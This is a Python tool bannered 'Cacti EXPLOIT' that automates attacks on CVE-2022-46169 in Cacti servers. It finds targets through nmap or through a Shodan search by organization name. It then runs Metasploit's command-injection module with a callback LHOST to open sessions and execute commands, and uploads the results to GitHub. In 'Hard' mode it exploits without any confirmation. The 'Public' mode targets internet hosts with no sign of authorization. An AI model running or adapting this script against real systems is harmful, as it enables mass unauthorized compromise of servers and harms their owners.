import subprocess
import netifaces
import re
import pyfiglet
import os
from report_public import generate_report

def get_ip_address(interface):
    try:
        addresses = netifaces.ifaddresses(interface)
        ip = addresses[netifaces.AF_INET][0]['addr']
        return ip
    except KeyError:
        return None

def save_local_ip_to_file(interface):
    ip_address = get_ip_address(interface)
    if ip_address:
        with open("local_ip.txt", "w") as file:
            file.write(ip_address)
    else:
        print(f"Unable to get IP address of {interface}")

def save_targets_to_file(targets):
    with open("targets.txt", "w") as file:
        for target in targets:
            file.write(target + "\n")

def extract_ip_addresses(input_file, output_file):
    with open(output_file, 'w') as output_file:
        with open(input_file, 'r') as file:
            for line in file:
                parts = line.split('\t')
                ip_address = parts[0]
                output_file.write(ip_address + '\n')

def scan_with_nmap():
    try:
        print("Cacti detection in progress...")
        subprocess.run(["nmap", "-sV", "-sC", "-Pn", "--script", "http-title", "-iL", "targets.txt", "-oN", "nmap_results.txt"])
        print("Cacti detection completed.")
    except FileNotFoundError:
        print("Nmap not found. Please make sure Nmap is installed and in your system's PATH.")
    except Exception as e:
        print("An error occurred:", str(e))
        print("Cacti not detected.")

def parse_nmap_results(filename):
    open_ports = {}
    with open(filename, "r") as file:
        lines = file.readlines()
        ip = None
        current_port_info = None
        for line in lines:
            if "Nmap scan report for" in line:
                ip = line.split()[-1].strip()
                open_ports[ip] = []
            elif "/tcp" in line and ip:
                parts = line.split()
                port = parts[0].split("/")[0]
                protocol = parts[0].split("/")[1]
                state = parts[1]
                service_info = {}
                service_info["service"] = parts[2]
                if len(parts) > 3:
                    service_info["version"] = " ".join(parts[3:])
                current_port_info = {"port": port, "protocol": protocol, "state": state, "service": service_info.get("service"), "info": service_info}
            elif line.startswith("|_http-title:") and current_port_info:
                http_title = " ".join(line.split(":")[1:]).strip()
                current_port_info["info"]["http-title"] = http_title
                if "cacti" in http_title.lower():
                    open_ports[ip].append(current_port_info)
                current_port_info = None  # Reset after processing
    return open_ports

def save_results_to_txt(results):
    with open("nmap_results_parsed.txt", "w") as file:
        for ip, ports in results.items():
            for port in ports:
                if port["state"] == "open":
                    file.write(f"{ip}  {port['port']}\n")
def shodan_search(query):
    try:
        result = subprocess.run(
            ['shodan', 'search', '--fields', 'ip_str,port,org,os,timestamp', query],
            capture_output=True,
            text=True
        )

        return result.stdout
    except subprocess.CalledProcessError as e:
        print("Error executing Shodan search command:")
        print(e.output)
        return None

def shodan_search_by_organization(org_name, output_file=None):
    query = f"cacti port:80 org:\"{org_name}\""

    result = shodan_search(query)

    if result:
        if output_file:
            try:
                with open(output_file, "w") as file:
                    file.write(result)
                print(f"Shodan search result saved to {output_file}")
            except IOError as e:
                print("Error saving the output file:")
                print(e)
        else:
            print(result)

def detect_cacti_vulnerability(ip, port, level):
    msf_command = f"msfconsole -qx 'use exploit/linux/http/cacti_unauthenticated_cmd_injection; set RHOSTS {ip}; set RPORT {port}; check; exit'"
    try:
        vuln_result = subprocess.check_output(msf_command, shell=True, stderr=subprocess.STDOUT).decode()
    except subprocess.CalledProcessError as e:
        print("Error occurred during vulnerability detection:")
        print(str(e))
        vuln_result = ""

    if "The target appears to be vulnerable. The target is Cacti version 1.2.22" in vuln_result:
        result = "Cacti vulnerability detected."
    else:
        result = "Cacti vulnerability not detected."

    if vuln_result:
        vulnerability_output = re.sub(r"\x1b\[[0-9;]*[mK]", "", vuln_result)
        with open(f"{ip}_vuln.txt", "w") as f:
            f.write(vulnerability_output)
        
        if level == "Medium" and result == "Cacti vulnerability detected.":
            user_input = input(f"Cacti vulnerability detected. {ip}:{port}. Do you want to exploit it? (Y/N): ")
            if user_input.strip().lower() != 'y':
                print(f"Skipping exploitation for {ip}:{port}")
                return result, None

    return result, vuln_result

def make_msf_resource_file(target, rport, lhost):
    resource_content = f"""
use exploit/linux/http/cacti_unauthenticated_cmd_injection
set RHOSTS {target}
set RPORT {rport}
set LHOST {lhost}
exploit -j
sleep 20
sessions -i
sessions -c 'ls -la' -i 1
sleep 10
exit
exit -y
"""
    with open("exploit_cacti_resource.rc", "w") as file:
        file.write(resource_content)

def exploit_cacti(target, rport, lhost):
    make_msf_resource_file(target, rport, lhost)
    msf_command = "msfconsole -q -r exploit_cacti_resource.rc"
    try:
        result = subprocess.run(msf_command, shell=True, capture_output=True, text=True)
        print(result.stdout)

        if result.stdout:
            exploit_output = re.sub(r"\x1b\[[0-9;]*[mK]", "", result.stdout)
            with open(f"{target}_exploit.txt", "w") as f:
                f.write(exploit_output)
    except subprocess.CalledProcessError as e:
        print("Error occurred during exploit:")
        print(str(e))
        error_output = result.stdout if e.output else "Unknown error occurred."
        with open(f"{target}_exploit_cacti_error.txt", "w") as file:
            file.write(error_output)

def detect_and_exploit_vulnerabilities_from_file(filename, lhost, level):
    with open(filename, "r") as file:
        lines = file.readlines()
        for line in lines:
            data = line.strip().split()
            if len(data) >= 2:
                ip = data[0]
                port = data[1]
                print(f"Processing Check Vulnerability: {ip}")
                result, vuln_result = detect_cacti_vulnerability(ip, port, level)
                if "Cacti vulnerability detected." in result:
                    print(f"CVE-2022-46169 Vulnerability Detected: {ip}")
                    if vuln_result:
                        print(f"Processing Exploit: {ip}")
                        exploit_cacti(ip, port, lhost)
                        print(f"Exploit successful: {ip}")
                else:
                    print(f"No CVE-2022-46169 Vulnerability Detected: {ip}")

    with open("vuln_scan.txt", "w") as vuln_result_file:
        for line in lines:
            data = line.strip().split()
            if len(data) >= 2:
                ip = data[0]
                try:
                    with open(f"{ip}_vuln.txt", "r") as vuln_file:
                        vuln_result_file.write(f"\n\n========== Vulnerability Scan Result for {ip} \n\n")
                        vuln_result_file.write(vuln_file.read())
                except FileNotFoundError:
                    print(f"No vulnerability file found for {ip}")

    print("Check and exploitation completed.")
                    
def detect_and_exploit_vulnerabilities_from_public(filename, lhost, level):
    with open(filename, "r") as file:
        lines = file.readlines()
        for line in lines:
            data = line.strip().split()
            if len(data) >= 2:
                ip = data[0]
                port = data[1]
                print(f"Processing Check Vulnerability: {ip}")
                result, vuln_result = detect_cacti_vulnerability(ip, port, level)
                if "Cacti vulnerability detected." in result:
                    print(f"CVE-2022-46169 Vulnerability Detected: {ip}")
                    if vuln_result:
                        print(f"Processing Exploit: {ip}")
                        exploit_cacti(ip, port, lhost)
                        print(f"Exploit successful: {ip}")
                else:
                    print(f"No CVE-2022-46169 Vulnerability Detected: {ip}")

    with open("vuln_scan_public.txt", "w") as vuln_result_file:
        for line in lines:
            data = line.strip().split()
            if len(data) >= 2:
                ip = data[0]
                try:
                    with open(f"{ip}_vuln.txt", "r") as vuln_file:
                        vuln_result_file.write(f"\n\n========== Vulnerability Scan Result for {ip} \n\n")
                        vuln_result_file.write(vuln_file.read())
                except FileNotFoundError:
                    print(f"No vulnerability file found for {ip}")

    print("Check and exploitation completed.")

def choose_pentesting_level():
    print("Choose the pentesting level:")
    print("1. Medium")
    print("2. Hard")
    level = input("Enter your choice (1 or 2): ")
    if level == '1':
        print("You selected Medium level pentesting.")
        return "Medium"
    elif level == '2':
        print("You selected Hard level pentesting.")
        return "Hard"
    else:
        print("Invalid choice. Please enter 1 or 2.")
        return choose_pentesting_level()

def report():
    print("Creating Reporting using report.py")
    subprocess.run(["python3", "report.py"])

def github():
    print("Creating file to Github using git.py")
    subprocess.run(["python3","git.py"])

def main():
    banner = pyfiglet.figlet_format("Cacti EXPLOIT")
    print(banner)
    print("Choose the execution mode:")
    print("1. Local")
    print("2. Public")
    mode = input("Enter your choice (1 or 2): ")

    if mode == "1":  # Local execution
        level = choose_pentesting_level()
        input_targets = input("Masukkan semua target IP atau domain, dipisahkan oleh koma: ")
        targets = input_targets.split(',')
        num_targets = len(targets)
        if len(targets) == 0 or (len(targets) == 1 and targets[0].strip() == ''):
            print("Anda belum memasukkan target apapun.")
        else:
            for target in targets:
                print(target.strip())
            interface = 'ens160'
            save_local_ip_to_file(interface)
            save_targets_to_file([target.strip() for target in targets])
            scan_with_nmap()
            filename = "nmap_results.txt"
            nmap_results = parse_nmap_results(filename)
            print("\nOpen Ports for Cacti:")
            for ip, ports in nmap_results.items():
                print(f"\n{ip}:")
            for port in ports:
                print(f"Port: {port['port']}, Protocol: {port['protocol']}, State: {port['state']}, Service: {port['service']}")
        save_results_to_txt(nmap_results)
        with open("nmap_results_parsed.txt", "r") as file:
            print("\nContents of nmap_results_parsed.txt:")
            print(file.read())
        detect_and_exploit_vulnerabilities_from_file("nmap_results_parsed.txt", get_ip_address(interface), level)

        report()
        target_range = f"Cacti"
        target_directory = target_range.replace("/", "_")
        os.makedirs(target_directory, exist_ok=True)
        os.rename("10.33.102.225_exploit.txt", os.path.join(target_directory, "10.33.102.225_exploit.txt"))
        os.rename("nmap_results.txt", os.path.join(target_directory, "nmap_results.txt"))
        os.rename("vuln_scan.txt", os.path.join(target_directory, "vuln_scan.txt"))
        os.rename("Penetration_Test_Report.docx", os.path.join(target_directory, "Penetration_Test_Report.docx"))
        os.rename("Penetration_Test_Report.pdf", os.path.join(target_directory, "Penetration_Test_Report.pdf"))
        print(f'Pentesting complete. Result saved to {target_directory}')

        github()
        print(f'complete')

    elif mode == "2":  # Public execution
        level = choose_pentesting_level()
        org_name = input("Enter the organization name: ")
        output_file = "shodan.txt"
        interface = 'ens160'
        save_local_ip_to_file(interface)
        shodan_search_by_organization(org_name, output_file)
        extract_ip_addresses("shodan.txt", "data.txt")
        detect_and_exploit_vulnerabilities_from_public(output_file, get_ip_address(interface),level)
        generate_report(output_file)
        github()
        print(f'complete')

    else:
        print("Invalid choice. Please enter either '1' or '2'.")

if __name__ == "__main__":
    main()
